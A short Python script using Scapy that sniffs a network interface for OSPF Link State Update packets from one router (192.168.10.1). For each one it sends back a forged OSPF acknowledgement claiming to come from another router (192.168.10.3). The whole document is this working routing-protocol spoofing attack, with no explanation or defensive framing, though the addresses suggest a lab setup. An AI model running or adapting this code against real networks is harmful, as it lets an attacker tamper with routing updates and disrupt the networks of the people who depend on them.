#!/usr/bin/env python3
from scapy.all import *
from scapy.contrib.ospf import *
def handle_lsa(packet):
    if packet.haslayer(OSPF_LSUpd) and packet[IP].src == "192.168.10.1":
        lsa_item = packet[OSPF_LSUpd].lsalist[0]
        lsa_hdr = OSPF_LSA_Hdr(age=lsa_item.age, options=lsa_item.options, 
                               type=lsa_item.type, id=lsa_item.id, 
                               adrouter=lsa_item.adrouter, seq=lsa_item.seq, 
                               chksum=lsa_item.chksum, len=lsa_item.len)
        ospf_lsa_ack = (Ether(dst="ca:01:0a:4c:00:00") / IP(dst="192.168.10.1") / 
                        OSPF_Hdr(area="0.0.0.0", authtype=0, src="192.168.10.3") / 
                        OSPF_LSAck(lsaheaders=[lsa_hdr]))
        sendp(ospf_lsa_ack, iface="eth0")
sniff(iface="eth0", filter="ip host 192.168.10.1", prn=handle_lsa, count=0)
